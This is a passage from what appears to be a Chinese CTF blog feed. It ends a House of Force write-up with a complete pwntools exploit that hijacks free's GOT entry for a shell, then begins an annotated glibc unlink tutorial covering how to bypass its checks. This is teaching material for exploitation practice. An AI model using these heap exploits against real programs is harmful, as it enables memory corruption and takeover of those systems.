class="number">32</span><span class="comment">(bcloud.got['free'])</span>)   <span class="attr"># chunk5</span>      <span class="attr">#5</span>    <span class="attr">#0</span> chu<span class="symbol">nk0</span> <span class="attr">#1</span> chu<span class="symbol">nk1</span></span><br><span class="line">edit<span class="comment">(1,p32(bcloud.plt['puts'])</span>)         <span class="comment">//这里就是把 free_got 指向的内容给换成了 puts_plt</span></span><br><span class="line">delete<span class="comment">(0)</span>     <span class="comment">//note_list[0]                         //这是的 free（ptr） 就是执行了 puts(puts_got)</span></span><br></pre></td></tr></table></figure><p>通过以上 我们便可以 将 泄露出 puts_got 地址<br>然后通过计算得system_got</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base_addr</span>=u32(sh.recv()[:<span class="number">4</span>])-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="attr">system_addr</span>=libc_base_addr+libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>然后我们向 free_got 指向的地址中写入system_Addr ，然后向其他的 note_list[i]中写入 /bin/sh 然后 free（ptr）就可拿到shell 了。<br>详见exp 如下：     </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="attribute">r</span>=process("./bcloud")</span><br><span class="line"><span class="attribute">bcloud</span>=ELF("./bcloud")</span><br><span class="line"><span class="attribute">libc</span>=ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line"></span><br><span class="line">def creat(chunk_size,value):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the length of the note content:'</span>)</span><br><span class="line">    r.sendline(str(chunk_size))</span><br><span class="line">    r.recvuntil(<span class="string">'Input the content:'</span>)</span><br><span class="line">    r.sendline(value)</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(index,value):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'Input the new content:'</span>)</span><br><span class="line">    r.sendline(value)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************泄漏堆基址 Heap_first_chunk_mem_addr"</span></span><br><span class="line"><span class="comment">#gdb.attach(r,'b *0x080487DD')</span></span><br><span class="line">r.recvuntil(<span class="string">'Input your name:'</span>)</span><br><span class="line">r.send(<span class="string">'A'</span><span class="number">*0</span>x40)</span><br><span class="line">r.recvuntil(<span class="string">'A'</span><span class="number">*0</span>x40)</span><br><span class="line"></span><br><span class="line"><span class="attribute">Heap_base_addr</span>=u32(r.recvuntil('!').strip('!'))</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"Heap base address is "</span>+hex(Heap_base_addr) #泄漏堆基址 Heap_first_chunk_mem_addr is 0x950b008</span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************************make top_chunk_size :0xFFFFFFFF"</span></span><br><span class="line">r.recvuntil(<span class="string">'Org:'</span>)</span><br><span class="line">r.send(<span class="string">'B'</span><span class="number">*0</span>x40)</span><br><span class="line">r.recvuntil(<span class="string">'Host:'</span>)</span><br><span class="line">r.sendline(p32(0xFFFFFFFF))</span><br><span class="line"></span><br><span class="line">                                 #                          base: 0x81d6000</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">creat(0x40,<span class="string">'Chunk1'</span>)             #0   0x81d6120   chunk0</span><br><span class="line">creat(0x40,<span class="string">'Chunk2'</span>)             #1   0x81d6120   chunk1</span><br><span class="line">creat(0x40,<span class="string">'/bin/sh\x00'</span>)        #2   0x81d6168   chunk2</span><br><span class="line">creat(0x40,<span class="string">'Chunk4'</span>)             #3   0x81d61b0   chunk3     top: 0x81d61f8</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"**************计算malloc 参数应该是多少，使得下下次malloc可申请到 我们的目的chunk(note_list:0x0804B120)"</span></span><br><span class="line"><span class="attribute">old_top_chunk_head</span>=Heap_base_addr+(0x40+0x8)*7-4*2</span><br><span class="line"><span class="attribute">new_top_chunk_head</span>=0x0804B120-0x4*2</span><br><span class="line">creat(new_top_chunk_head-old_top_chunk_head-4<span class="number">*2</span>,<span class="string">'Chunk_fake'</span>)     # fake chunk4  #4</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************************构造 plt_puts(got_puts)"</span></span><br><span class="line">creat(0x40,p32(bcloud.got[<span class="string">'puts'</span>])+p32(bcloud.got[<span class="string">'free'</span>]))   #5  chunk5    #0 chunk0 #chunk1</span><br><span class="line"><span class="builtin-name">edit</span>(1,p32(bcloud.plt[<span class="string">'puts'</span>])) </span><br><span class="line">delete(0)                        # plt_puts(got_puts)  </span><br><span class="line">r.recvline()</span><br><span class="line"><span class="attribute">libc_base_addr</span>=u32(r.recv()[:4])-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libc_base_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"libc_base_addr is "</span>+hex(libc_base_addr)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"system_addr is "</span>+hex(system_addr)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">""</span><span class="string">"*********************************************************构造 system("</span>/bin/sh\x00<span class="string">")"</span><span class="string">""</span></span><br><span class="line">r.sendline(<span class="string">'3'</span>)                  #edit</span><br><span class="line">r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">r.sendline(str(1))</span><br><span class="line">r.recvuntil(<span class="string">'Input the new content:'</span>)</span><br><span class="line">r.sendline(p32(system_addr))</span><br><span class="line"><span class="builtin-name">edit</span>(2,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(2)                       # system(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>成功拿到shell 效果图：<br><img src="https://s1.ax1x.com/2020/04/30/JHD42R.png" alt="JHD42R.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;House Of Force.我太弱了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="堆学习" scheme="http://yoursite.com/tags/%E5%A0%86%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>unlink 再学习及unlink_hitcon2014_stkof题解</title>
    <link href="http://yoursite.com/2020/04/28/unlink%20%E5%86%8D%E5%AD%A6%E4%B9%A0%E5%8F%8Aunlink_hitcon2014_stkof%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/04/28/unlink 再学习及unlink_hitcon2014_stkof题解/</id>
    <published>2020-04-28T15:12:15.000Z</published>
    <updated>2020-04-29T11:51:53.453Z</updated>
    
    <content type="html"><![CDATA[<p>最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！<br>这次就 学习下 unlink。<br>一般只在  存在堆溢出，知道全局结构体数组地址， got 可改， 不开启 pie 和full relro 的情况下使用。</p><a id="more"></a><h1 id="unlink相关源码："><a href="#unlink相关源码：" class="headerlink" title="unlink相关源码："></a>unlink相关源码：</h1><p>源码中 变量：<br>p ：当前要free的 chunk<br>size:当前 chunk_size</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/*</span> <span class="string">consolidate</span> <span class="string">backward</span> <span class="string">向后合并</span>    <span class="string">其中向后合并也是最常见的类型*/</span>         </span><br><span class="line"><span class="number">4277</span>            <span class="string">if</span> <span class="string">(!prev_inuse(p))</span> <span class="string">&#123;</span>      <span class="string">//如果当前chunk前一个chunk是free的</span></span><br><span class="line"><span class="number">4278</span>              <span class="string">prevsize</span> <span class="string">=</span> <span class="string">prev_size</span> <span class="string">(p);//取得前一个chunk的size</span></span><br><span class="line"><span class="number">4279</span>              <span class="string">size</span> <span class="string">+=</span> <span class="string">prevsize;</span>        <span class="string">//当前chunk的size</span> <span class="string">等于它加上</span> <span class="string">上一个chunk的size</span></span><br><span class="line"><span class="number">4280</span>              <span class="string">p</span> <span class="string">=</span> <span class="string">chunk_at_offset(p,</span> <span class="string">-((long)</span> <span class="string">prevsize));//根据当前chunk的prevsize去得到上一个chunk</span></span><br><span class="line"><span class="number">4281</span>              <span class="string">unlink(av,</span> <span class="string">p,</span> <span class="string">bck,</span> <span class="string">fwd);</span> <span class="string">//unlink</span> <span class="string">上一个chunk</span></span><br><span class="line"><span class="number">4282</span>            <span class="string">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="number">4283</span>        </span><br><span class="line"><span class="number">4284</span>            <span class="string">if</span> <span class="string">(nextchunk</span> <span class="string">!=</span> <span class="string">av-&gt;top)</span> <span class="string">&#123;</span>  <span class="string">//如果下一个chunk</span> <span class="string">不是top</span> <span class="string">chunk</span></span><br><span class="line"><span class="number">4285</span>              <span class="string">/*</span> <span class="string">get</span> <span class="string">and</span> <span class="string">clear</span> <span class="string">inuse</span> <span class="string">bit</span> <span class="string">*/</span></span><br><span class="line"><span class="number">4286</span>              <span class="string">nextinuse</span> <span class="string">=</span> <span class="string">inuse_bit_at_offset(nextchunk,</span> <span class="string">nextsize);//取得下一个chunk的的</span> <span class="string">size</span> <span class="string">的inuse位</span></span><br><span class="line"><span class="number">4287</span>        </span><br><span class="line"><span class="number">4288</span>              <span class="string">/*</span> <span class="string">consolidate</span> <span class="string">forward</span>  <span class="string">向前合并</span> <span class="string">*/</span></span><br><span class="line"><span class="number">4289</span>              <span class="string">if</span> <span class="string">(!nextinuse)</span> <span class="string">&#123;</span>     <span class="string">//如果下一个chunk的size的inuse</span> <span class="string">是</span> <span class="number">0</span><span class="string">即</span> <span class="string">该chunk</span> <span class="string">是</span> <span class="string">free</span> <span class="string">的话。</span></span><br><span class="line"><span class="number">4290</span>                <span class="string">unlink(av,</span> <span class="string">nextchunk,</span> <span class="string">bck,</span> <span class="string">fwd);</span>  <span class="string">/便将</span> <span class="string">下一个chunk</span> <span class="string">进行</span> <span class="string">unlink</span></span><br><span class="line"><span class="number">4291</span>                <span class="string">size</span> <span class="string">+=</span> <span class="string">nextsize;</span>                 <span class="string">//当前</span> <span class="string">size</span> <span class="string">等于</span> <span class="string">再加上</span> <span class="string">下一个</span> <span class="string">chunk的size</span> </span><br><span class="line"><span class="number">4292</span>              <span class="string">&#125;</span> <span class="string">else</span></span><br><span class="line"><span class="number">4293</span>                <span class="string">clear_inuse_bit_at_offset(nextchunk,</span> <span class="number">0</span><span class="string">);</span>  <span class="string">//如果下一个chunk不是free，则将的prev_size的inuse由</span> <span class="number">1</span><span class="string">-&gt;0</span> </span><br><span class="line"><span class="number">4294</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4295</span>              <span class="string">/*</span> <span class="string">后面这部分</span></span><br><span class="line"><span class="number">4296</span>                <span class="string">Place</span> <span class="string">the</span> <span class="string">chunk</span> <span class="string">in</span> <span class="string">unsorted</span> <span class="string">chunk</span> <span class="string">list.</span> <span class="string">Chunks</span> <span class="string">are</span></span><br><span class="line"><span class="number">4297</span>                <span class="string">not</span> <span class="string">placed</span> <span class="string">into</span> <span class="string">regular</span> <span class="string">bins</span> <span class="string">until</span> <span class="string">after</span> <span class="string">they</span> <span class="string">have</span></span><br><span class="line"><span class="number">4298</span>                <span class="string">been</span> <span class="string">given</span> <span class="string">one</span> <span class="string">chance</span> <span class="string">to</span> <span class="string">be</span> <span class="string">used</span> <span class="string">in</span> <span class="string">malloc.</span></span><br><span class="line"></span><br><span class="line">                    <span class="string">将</span> <span class="string">chunk</span> <span class="string">放入ubsigned</span> <span class="string">bin</span> <span class="string">中。</span> <span class="string">chunk是</span></span><br><span class="line">                    <span class="string">直到它们放入后才放入常规bin</span> <span class="string">中</span></span><br><span class="line">                    <span class="string">获得了一次在malloc中使用的机会。</span></span><br><span class="line"><span class="number">4299</span>              <span class="string">*/</span></span><br><span class="line"><span class="number">4300</span>        </span><br><span class="line">                    <span class="string">//整理chunk</span> <span class="string">结构放入</span> <span class="string">unsorted</span> <span class="string">bin</span> <span class="string">中</span></span><br><span class="line">                    <span class="string">//将合并好的</span> <span class="string">chunk</span> <span class="string">加入到</span> <span class="string">unsorted</span> <span class="string">bin，如果属于</span> <span class="string">small</span> <span class="string">chunk的话</span> <span class="string">是没有</span> <span class="string">fd_nextsize和bk_nextsize的</span></span><br><span class="line">                    <span class="string">//然后</span> <span class="string">设置</span> <span class="string">合并后的</span> <span class="string">chunk的</span> <span class="string">头部</span></span><br><span class="line">                    <span class="string">//设置合并后的size，合并chunk的下一个chunk的</span> <span class="string">prev_size.</span></span><br><span class="line">                    </span><br><span class="line"><span class="number">4301</span>              <span class="string">bck</span> <span class="string">=</span> <span class="string">unsorted_chunks(av);</span></span><br><span class="line"><span class="number">4302</span>              <span class="string">fwd</span> <span class="string">=</span> <span class="string">bck-&gt;fd;</span></span><br><span class="line"><span class="number">4303</span>              <span class="string">if</span> <span class="string">(__glibc_unlikely</span> <span class="string">(fwd-&gt;bk</span> <span class="string">!=</span> <span class="string">bck))</span></span><br><span class="line"><span class="number">4304</span>                <span class="string">malloc_printerr</span> <span class="string">("free():</span> <span class="string">corrupted</span> <span class="string">unsorted</span> <span class="string">chunks");</span></span><br><span class="line"><span class="number">4305</span>              <span class="string">p-&gt;fd</span> <span class="string">=</span> <span class="string">fwd;</span></span><br><span class="line"><span class="number">4306</span>              <span class="string">p-&gt;bk</span> <span class="string">=</span> <span class="string">bck;</span></span><br><span class="line"><span class="number">4307</span>              <span class="string">if</span> <span class="string">(!in_smallbin_range(size))</span></span><br><span class="line"><span class="number">4308</span>                <span class="string">&#123;</span></span><br><span class="line"><span class="number">4309</span>                  <span class="string">p-&gt;fd_nextsize</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></span><br><span class="line"><span class="number">4310</span>                  <span class="string">p-&gt;bk_nextsize</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></span><br><span class="line"><span class="number">4311</span>                <span class="string">&#125;</span></span><br><span class="line"><span class="number">4312</span>              <span class="string">bck-&gt;fd</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4313</span>              <span class="string">fwd-&gt;bk</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4314</span>        </span><br><span class="line"><span class="number">4315</span>              <span class="string">set_head(p,</span> <span class="string">size</span> <span class="string">|</span> <span class="string">PREV_INUSE);</span></span><br><span class="line"><span class="number">4316</span>              <span class="string">set_foot(p,</span> <span class="string">size);</span></span><br><span class="line"><span class="number">4317</span>        </span><br><span class="line"><span class="number">4318</span>              <span class="string">check_free_chunk(av,</span> <span class="string">p);</span></span><br><span class="line"><span class="number">4319</span>            <span class="string">&#125;</span></span><br><span class="line"><span class="number">4320</span>        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4321</span>            <span class="string">/*</span></span><br><span class="line"><span class="number">4322</span>              <span class="string">If</span> <span class="string">the</span> <span class="string">chunk</span> <span class="string">borders</span> <span class="string">the</span> <span class="string">current</span> <span class="string">high</span> <span class="string">end</span> <span class="string">of</span> <span class="string">memory,</span></span><br><span class="line"><span class="number">4323</span>              <span class="string">consolidate</span> <span class="string">into</span> <span class="string">top</span></span><br><span class="line"><span class="number">4324</span>            <span class="string">*/</span></span><br><span class="line"><span class="number">4325</span>        </span><br><span class="line"><span class="number">4326</span>            <span class="string">else</span> <span class="string">&#123;</span></span><br><span class="line"><span class="number">4327</span>              <span class="string">size</span> <span class="string">+=</span> <span class="string">nextsize;</span></span><br><span class="line"><span class="number">4328</span>              <span class="string">set_head(p,</span> <span class="string">size</span> <span class="string">|</span> <span class="string">PREV_INUSE);</span></span><br><span class="line"><span class="number">4329</span>              <span class="string">av-&gt;top</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4330</span>              <span class="string">check_chunk(av,</span> <span class="string">p);</span></span><br><span class="line"><span class="number">4331</span>            <span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="unlink-："><a href="#unlink-：" class="headerlink" title="unlink ："></a>unlink ：</h1><p>放一个 ctfwiki上的经典图示：<br><a href="https://imgchr.com/i/J7gx9e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/29/J7gx9e.png" alt="J7gx9e.png"></a><br>很是类似双链表的 卸 块吧。<br>看unlink 宏的实现源码：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))<span class="comment">//如果 该chunk的size 和 下一个chunk 的prev_size相等的话。   </span></span><br><span class="line">              malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);           <span class="comment">// 会爆错："corrupted size vs. prev_size"        </span></span><br><span class="line">               <span class="comment">//绕过姿势: 修改使得  该chunk的size 和 下一个chunk 的prev_size相等 即可 </span></span><br><span class="line">            FD = P-&gt;fd;    <span class="comment">//FD=p+0x10                                                                     </span></span><br><span class="line">            BK = P-&gt;bk;    <span class="comment">//BK=p+0x18                                                                  </span></span><br><span class="line">            <span class="function"><span class="title">if</span> (__builtin_expect (FD-&gt;</span><span class="function"><span class="title">bk</span> != P || BK-&gt;</span>fd != P, <span class="number">0</span>)) <span class="comment">//如果 *(*(p+0x10) +0x18) 不是p 或者*(*(p+0x18)+0x10)不是 p                    </span></span><br><span class="line">              malloc_printerr (<span class="string">"corrupted double-linked list"</span>);   <span class="comment">// 会爆错："corrupted double-linked list"</span></span><br><span class="line">              <span class="comment">//绕过姿势:  我们使   *(p+0x10)是  &amp;p-0x18 ；*(p+0x18)是 &amp;p-0x10</span></span><br><span class="line">                          即            FD ==  &amp;p-<span class="number">0</span>x18       BK==  &amp;p-<span class="number">0</span>x10 </span><br><span class="line">                          </span><br><span class="line">                                                                                                      </span><br><span class="line">            <span class="keyword">else</span> &#123;              <span class="comment">//以下两行为 unlink的关键 ，正常的话就是 进行上面图示的操作</span></span><br><span class="line">                                <span class="comment">//而我们是要利用，就用  为了绕过上面检测 用的FD 和BK 吧。</span></span><br><span class="line">                                <span class="comment">//     FD = P-&gt;fd;    //即 FD=p+0x10                                                                     </span></span><br><span class="line">                                <span class="comment">//     BK = P-&gt;bk;    //即 BK=p+0x18    </span></span><br><span class="line">                               <span class="comment">//绕过姿势:  我们使  *(p+0x10)是  &amp;p-0x18 ；*(p+0x18)是 &amp;p-0x10</span></span><br><span class="line">                               <span class="comment">//        即          FD ==  &amp;p-0x18            BK==  &amp;p-0x10       </span></span><br><span class="line">                                                                               </span><br><span class="line">                FD-&gt;bk = BK;     <span class="comment">// FD+0x18=&amp;p-0x10    即*(*(p-0x18)+0x18)=&amp;p-0x10                                              </span></span><br><span class="line">                BK-&gt;fd = FD;     <span class="comment">// BK+0x10=&amp;p-0x18    即*(*(p-0x10)+0x10)=&amp;p-0x18    //关键 </span></span><br><span class="line">                </span><br><span class="line">                            <span class="comment">//所以 攻击后，FD</span></span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="comment">//下面的就不重要，攻击的话 一般不会使用 largh chunk的。就不做分析了。</span></span><br><span class="line">                                                                                                                </span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                             </span><br><span class="line">                    &amp;&amp; __<span class="function"><span class="title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="number">0</span>)) &#123;                      </span><br><span class="line">                    <span class="function"><span class="title">if</span> (__builtin_expect (P-&gt;</span><span class="function"><span class="title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                        || __<span class="function"><span class="title">builtin_expect</span> (P-&gt;</span><span class="function"><span class="title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                      malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   </span><br><span class="line">                    <span class="function"><span class="title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;                                      </span><br><span class="line">                        <span class="function"><span class="title">if</span> (P-&gt;</span>fd_nextsize == P)                                      </span><br><span class="line">                          FD-&gt;<span class="function"><span class="title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;                      </span><br><span class="line">                        <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                            FD-&gt;<span class="function"><span class="title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;                              </span><br><span class="line">                            FD-&gt;<span class="function"><span class="title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;                              </span><br><span class="line">                            P-&gt;<span class="function"><span class="title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;                              </span><br><span class="line">                            P-&gt;<span class="function"><span class="title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;                              </span><br><span class="line">                          &#125;                                                              </span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                        P-&gt;<span class="function"><span class="title">fd_nextsize</span>-&gt;</span><span class="function"><span class="title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;                      </span><br><span class="line">                        P-&gt;<span class="function"><span class="title">bk_nextsize</span>-&gt;</span><span class="function"><span class="title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;                      </span><br><span class="line">                      &#125;                                                                                   &#125;                                                                      \</span><br><span class="line">              &#125;                                                                              </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们来debug 下：<br>这里以 i春秋的 demo来具体 了解下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 